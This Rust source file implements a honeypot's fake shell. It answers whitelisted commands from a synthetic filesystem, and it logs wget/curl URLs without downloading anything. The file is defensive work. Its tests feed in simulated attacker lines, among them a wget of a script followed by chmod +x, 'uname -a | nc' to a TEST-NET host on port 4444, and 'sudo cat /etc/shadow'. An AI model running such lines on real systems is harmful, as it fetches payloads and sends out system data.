//! 假 Shell 命令仿真层（0.5.9 H103）：白名单制命令响应 + 静态假文件系统视图。
//!
//! 设计约束（ROADMAP H100 红线）：
//! - **白名单而非黑名单**：未列出的命令一律 `bash: <cmd>: command not found`，
//!   错误文案对齐真实 bash，不泄漏「我是蜜罐」特征；
//! - 攻击者输入永远当「数据」：清洗、截断、只仿真组合命令的首个命令，
//!   永不拼接进任何系统调用，永不 fork 真实进程；
//! - `wget/curl` 只记录 URL 与参数，默认不真正发起下载，回显模拟成功以延续会话；
//! - 会话限制：命令数达上限即优雅退出（断连风格由传输层对齐 OpenSSH，H104）。

use aisafeguard_core::event::ShellStep;

use crate::sanitize;

/// 单条命令输入的截断上限（负路径：≥4KB 输入不 panic、有界留存）
const MAX_CMD_CHARS: usize = 4096;

/// 会话内一行输入的处理结果
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ShellAction {
    /// 回显文本（不含结尾 prompt；空串 = 仅出新 prompt，对齐真实命令的静默成功）
    Reply(String),
    /// exit / 命令数达上限：优雅断开
    Exit,
}

/// 一次假 Shell 会话：维护历史与逐命令记录，输出事件层的 [`ShellStep`] 数组。
pub struct ShellSession {
    user: String,
    host: String,
    max_commands: usize,
    history: Vec<String>,
    steps: Vec<ShellStep>,
}

impl ShellSession {
    pub fn new(user: impl Into<String>, host: impl Into<String>, max_commands: usize) -> Self {
        Self {
            user: user.into(),
            host: host.into(),
            max_commands,
            history: Vec::new(),
            steps: Vec::new(),
        }
    }

    /// 假 prompt：`user@host:~$ `（用户名/主机名可配，模板参数化归 0.5.11 H300）
    pub fn prompt(&self) -> String {
        format!("{}@{}:~$ ", self.user, self.host)
    }

    /// 本会话逐命令记录（事件 interaction 字段的直接来源）
    pub fn steps(&self) -> &[ShellStep] {
        &self.steps
    }

    pub fn history(&self) -> &[String] {
        &self.history
    }

    /// 处理一行攻击者输入：清洗 → 截断 → 只仿真首个命令 → 记录 ShellStep。
    /// 任何输入都不 panic（负路径由模糊测试守护）。
    pub fn handle_line(&mut self, raw: &str) -> ShellAction {
        if self.history.len() >= self.max_commands {
            return ShellAction::Exit;
        }
        let line = sanitize(raw.as_bytes(), MAX_CMD_CHARS);
        let line = line.trim();
        if line.is_empty() {
            // 空行对齐真实 bash：不出历史、不进记录，仅出新 prompt
            return ShellAction::Reply(String::new());
        }

        let first = segment_before_combinator(line);
        let (response, exit) = self.simulate(first);
        self.history.push(line.to_string());
        self.steps.push(ShellStep {
            command: line.to_string(),
            response: response.clone(),
        });
        if exit {
            ShellAction::Exit
        } else {
            ShellAction::Reply(response)
        }
    }

    /// 仿真单个命令（组合命令只解析首个，其余原样记录在 step.command）。
    fn simulate(&self, cmd: &str) -> (String, bool) {
        let mut parts = cmd.split_whitespace();
        let Some(program) = parts.next() else {
            return (
                "bash: syntax error near unexpected token `;'".to_string(),
                false,
            );
        };
        let args: Vec<&str> = parts.collect();
        match program {
            "exit" | "logout" => (String::new(), true),
            "whoami" => (self.user.clone(), false),
            "id" => (
                format!(
                    "uid=1000({u}) gid=1000({u}) groups=1000({u}),27(sudo),33(www-data)",
                    u = self.user
                ),
                false,
            ),
            "uname" => (self.uname(&args), false),
            "pwd" => (format!("/home/{}", self.user), false),
            "ls" => (self.ls(&args), false),
            "cat" => (self.cat(&args), false),
            "ps" => (ps_snapshot().to_string(), false),
            "ifconfig" => (ifconfig_snapshot().to_string(), false),
            "ip" if args.first().is_some_and(|a| *a == "addr") => {
                (ip_addr_snapshot().to_string(), false)
            }
            "netstat" => (netstat_snapshot().to_string(), false),
            "wget" | "curl" => (self.download(program, &args), false),
            "chmod" => (String::new(), false),
            "history" => (self.history_reply(), false),
            other => (
                format!("bash: {other}: command not found"),
                false,
            ),
        }
    }

    fn uname(&self, args: &[&str]) -> String {
        if args.contains(&"-a") {
            format!(
                "Linux {host} 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux",
                host = self.host
            )
        } else if args.contains(&"-r") {
            "6.1.0-18-amd64".to_string()
        } else {
            "Linux".to_string()
        }
    }

    fn ls(&self, args: &[&str]) -> String {
        // ls 的参数里取第一个非 - 开头的词作路径；无路径 = 当前目录（~ = /home/<user>）
        let home = format!("/home/{}", self.user);
        let path: String = args
            .iter()
            .find(|a| !a.starts_with('-'))
            .map(|s| s.to_string())
            .unwrap_or_else(|| home.clone());
        let listing: Option<Vec<String>> = if path == home {
            Some(vec![
                ".bash_history".into(),
                ".profile".into(),
                ".ssh".into(),
                "app".into(),
                "logs".into(),
            ])
        } else if path == "/home" {
            Some(vec![self.user.clone()])
        } else {
            ls_listing(&path).map(|v| v.into_iter().map(String::from).collect())
        };
        match listing {
            Some(names) => names.join("  "),
            None => format!("ls: cannot access '{path}': No such file or directory"),
        }
    }

    fn cat(&self, args: &[&str]) -> String {
        let Some(path) = args.first().copied() else {
            // 真实 cat 无操作数时等待 stdin；行模式下以静默对应
            return String::new();
        };
        match cat_file(path, &self.host) {
            Some(content) => content.to_string(),
            None => format!("cat: {path}: No such file or directory"),
        }
    }

    /// wget/curl：只记录 URL 与参数，不发起真实下载；回显模拟成功延续会话。
    fn download(&self, program: &str, args: &[&str]) -> String {
        // 取第一个含 :// 的词为目标 URL；没有则按无 URL 参数处理
        let url = args
            .iter()
            .find(|a| a.contains("://"))
            .copied()
            .unwrap_or_default();
        if url.is_empty() {
            return format!("bash: {program}: command not found");
        }
        let host = url
            .split("://")
            .nth(1)
            .unwrap_or_default()
            .split(['/', ':'])
            .next()
            .unwrap_or_default()
            .to_string();
        let name = url.rsplit('/').next().unwrap_or("index.html").to_string();
        let name = if name.is_empty() {
            "index.html".to_string()
        } else {
            name
        };
        if program == "wget" {
            format!(
                "--2024-01-15 09:30:00--  {url}\nResolving {host}... 203.0.113.10\nConnecting to {host}|203.0.113.10|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1024 (1.0K) [text/plain]\nSaving to: '{name}'\n\n'{name}' saved [1024/1024]"
            )
        } else {
            "  % Total    % Received  % Xferd  Average Speed   Time    Time     Time  Current Time\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1024  100  1024      0      0   1024      0  0:00:01 --:--:--  0:00:01  1024"
                .to_string()
        }
    }

    fn history_reply(&self) -> String {
        self.history
            .iter()
            .enumerate()
            .map(|(i, cmd)| format!("{:>5}  {}", i + 1, cmd))
            .collect::<Vec<_>>()
            .join("\n")
    }
}

/// 组合命令只解析首个：在 `;` `|` `&` 处截断（引号内的 & 简化处理：截断只影响
/// 响应仿真，完整命令原样入记录）。
fn segment_before_combinator(line: &str) -> &str {
    match line.find([';', '|', '&']) {
        Some(i) => &line[..i],
        None => line,
    }
}

// ---------- 静态假文件系统（内置合成常量，零真实数据；H210 canary 预留接点） ----------

fn ls_listing(path: &str) -> Option<Vec<&'static str>> {
    match path {
        "/" => Some(vec![
            "bin", "boot", "dev", "etc", "home", "lib", "lib64", "media", "mnt", "opt", "proc",
            "root", "run", "sbin", "srv", "sys", "tmp", "usr", "var",
        ]),
        "/etc" => Some(vec![
            "hostname", "hosts", "os-release", "passwd", "shadow", "ssh", "systemd",
        ]),
        "/home" => Some(vec!["deploy"]),
        "/var" => Some(vec!["log", "www"]),
        "/var/www" => Some(vec!["html"]),
        _ => None,
    }
}

/// cat 的内置诱饵内容：结构与真实文件一致，数据全部合成（明显假/零值）。
fn cat_file(path: &str, host: &str) -> Option<String> {
    match path {
        "/etc/hostname" => Some(format!("{host}\n")),
        "/etc/passwd" => Some(concat!(
            "root:x:0:0:root:/root:/bin/bash\n",
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
            "deploy:x:1000:1000:deploy:/home/deploy:/bin/bash\n",
        ).to_string()),        "/etc/shadow" => Some(concat!(
            "root:*:19769:0:99999:7:::\n",
            "daemon:*:19769:0:99999:7:::\n",
            "deploy:$6$PLACEHOLDER$FAKEHASHNOTREAL:19769:0:99999:7:::\n",
        ).to_string()),        "/etc/hosts" => Some(concat!(
            "127.0.0.1\tlocalhost\n",
            "127.0.1.1\tdebian-11\n",
            "::1\tip6-localhost\n",
        ).to_string()),        "/etc/os-release" => Some(concat!(
            "PRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\n",
            "NAME=\"Debian GNU/Linux\"\n",
            "ID=debian\n",
        ).to_string()),        _ => None,
    }
}

// ---------- 静态命令快照（合成常量；外网地址一律 TEST-NET 明显假值） ----------

fn ps_snapshot() -> &'static str {
    concat!(
        "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n",
        "root         1  0.0  0.1 167776 11504 ?        Ss   09:00   0:02 /sbin/init\n",
        "root       412  0.0  0.2  28880 15432 ?        Ss   09:00   0:00 /usr/sbin/sshd -D\n",
        "www-data   902  0.1  0.5 123456 52224 ?        S    09:01   0:03 php-fpm: pool www\n",
        "deploy    1204  0.0  0.3  98760 30120 ?        S    09:02   0:01 python3 app/main.py\n",
    )
}

fn ifconfig_snapshot() -> &'static str {
    concat!(
        "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n",
        "        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n",
        "        ether 52:54:00:12:34:56  txqueuelen 1000  (Ethernet)\n",
        "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n",
        "        inet 127.0.0.1  netmask 255.0.0.0\n",
    )
}

fn ip_addr_snapshot() -> &'static str {
    concat!(
        "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN\n",
        "    inet 127.0.0.1/8 scope host lo\n",
        "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP\n",
        "    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0\n",
    )
}

fn netstat_snapshot() -> &'static str {
    concat!(
        "Active Internet connections (servers and established)\n",
        "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n",
        "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n",
        "tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n",
        "tcp        0      0 10.0.2.15:22            203.0.113.50:51234      ESTABLISHED\n",
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn session() -> ShellSession {
        ShellSession::new("deploy", "debian-11", 50)
    }

    #[test]
    fn whitelist_commands_respond() {
        let mut s = session();
        assert_eq!(s.prompt(), "deploy@debian-11:~$ ");
        assert_eq!(
            s.handle_line("whoami"),
            ShellAction::Reply("deploy".into())
        );
        assert!(s
            .handle_line("uname -a")
            .reply_contains("Linux debian-11 6.1.0-18-amd64"));
        assert_eq!(
            s.handle_line("pwd"),
            ShellAction::Reply("/home/deploy".into())
        );
        assert!(s.handle_line("id").reply_contains("uid=1000(deploy)"));
        assert!(s.handle_line("ls").reply_contains(".bash_history"));
        assert!(s.handle_line("cat /etc/passwd").reply_contains("deploy:x:1000"));
        assert!(s
            .handle_line("cat /etc/hostname")
            .reply_contains("debian-11"));
        assert!(s.handle_line("ps aux").reply_contains("/usr/sbin/sshd"));
        assert!(s.handle_line("ifconfig").reply_contains("inet 10.0.2.15"));
        assert!(s.handle_line("ip addr").reply_contains("10.0.2.15/24"));
        assert!(s
            .handle_line("netstat -antup")
            .reply_contains("ESTABLISHED"));
        assert!(s
            .handle_line("wget http://203.0.113.10/x.sh")
            .reply_contains("saved"));
        assert!(s
            .handle_line("curl -sL http://203.0.113.10/x.sh")
            .reply_contains("100"));
        // chmod 静默成功（对齐真实 chmod）
        assert_eq!(s.handle_line("chmod +x x.sh"), ShellAction::Reply("".into()));
    }

    #[test]
    fn unknown_command_matches_bash_text() {
        let mut s = session();
        assert_eq!(
            s.handle_line("mimikatz"),
            ShellAction::Reply("bash: mimikatz: command not found".into())
        );
        // 不泄漏蜜罐特征：文案与真实 bash 一致，无多余提示
        let r = s.handle_line("sudo cat /etc/shadow").unwrap_reply();
        assert_eq!(r, "bash: sudo: command not found");
    }

    #[test]
    fn combinator_only_first_segment_simulated() {
        let mut s = session();
        // ; | && 只解析首个命令,完整命令原样入记录
        let r = s.handle_line("whoami; cat /etc/shadow").unwrap_reply();
        assert_eq!(r, "deploy");
        assert_eq!(s.steps[0].command, "whoami; cat /etc/shadow");
        let r = s.handle_line("uname -a | nc 203.0.113.9 4444").unwrap_reply();
        assert!(r.contains("Linux debian-11"));
        let r = s.handle_line("pwd && whoami").unwrap_reply();
        assert_eq!(r, "/home/deploy");
    }

    #[test]
    fn history_lists_previous_commands() {
        let mut s = session();
        s.handle_line("whoami");
        s.handle_line("uname -a");
        let r = s.handle_line("history").unwrap_reply();
        assert!(r.contains("whoami") && r.contains("uname -a"));
        // history 自身不出现在输出里(真实 bash 亦然——执行时才入史)
        assert!(r.contains("    1  whoami"));
    }

    #[test]
    fn exit_and_command_limit_close_session() {
        let mut s = ShellSession::new("deploy", "h", 2);
        assert_eq!(s.handle_line("whoami"), ShellAction::Reply("deploy".into()));
        assert_eq!(s.handle_line("whoami"), ShellAction::Reply("deploy".into()));
        // 第 3 条命令:已达上限,优雅退出
        assert_eq!(s.handle_line("pwd"), ShellAction::Exit);
        let mut s2 = session();
        assert_eq!(s2.handle_line("exit"), ShellAction::Exit);
        assert_eq!(s2.handle_line("logout"), ShellAction::Exit);
    }

    #[test]
    fn long_and_binary_input_bounded_never_panic() {
        let mut s = session();
        // ≥4KB 超长输入：截断、可处理、有界留存
        let long = format!("cat /etc/passwd{}", "A".repeat(8192));
        assert!(matches!(s.handle_line(&long), ShellAction::Reply(_)));
        assert!(s.steps.last().unwrap().command.chars().count() <= MAX_CMD_CHARS);
        // 二进制乱码：控制字符清洗进记录,不 panic
        let garbage = "\u{0}\u{1}\u{7f}\u{9f}ls\u{3}";
        assert!(matches!(s.handle_line(garbage), ShellAction::Reply(_)));
        let recorded = &s.steps.last().unwrap().command;
        assert!(!recorded.chars().any(|c| c.is_control() && c != '\t'));
        // 空行与纯分隔符
        assert_eq!(s.handle_line("   "), ShellAction::Reply(String::new()));
        assert!(s
            .handle_line(";")
            .reply_contains("syntax error near unexpected token"));
    }

    #[test]
    fn fuzz_random_lines_never_panic() {
        let mut s = ShellSession::new("deploy", "h", 50);
        let mut state = 0x2545F4914F6CDD1Du64;
        for _ in 0..2000 {
            state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
            let n = (state >> 33) as usize % 300;
            let bytes: Vec<u8> = (0..n)
                .map(|_| {
                    state = state.wrapping_mul(6364136223846793005).wrapping_add(1);
                    (state >> 33) as u8
                })
                .collect();
            let line = String::from_utf8_lossy(&bytes).to_string();
            let _ = s.handle_line(&line);
            assert!(s.steps.len() <= 2000);
            for step in &s.steps {
                assert!(step.command.chars().count() <= MAX_CMD_CHARS);
            }
        }
    }

    // ---- 断言辅助 ----

    impl ShellAction {
        fn reply_contains(&self, needle: &str) -> bool {
            matches!(self, ShellAction::Reply(text) if text.contains(needle))
        }
        fn unwrap_reply(self) -> String {
            match self {
                ShellAction::Reply(text) => text,
                ShellAction::Exit => panic!("期望 Reply,得到 Exit"),
            }
        }
    }
}
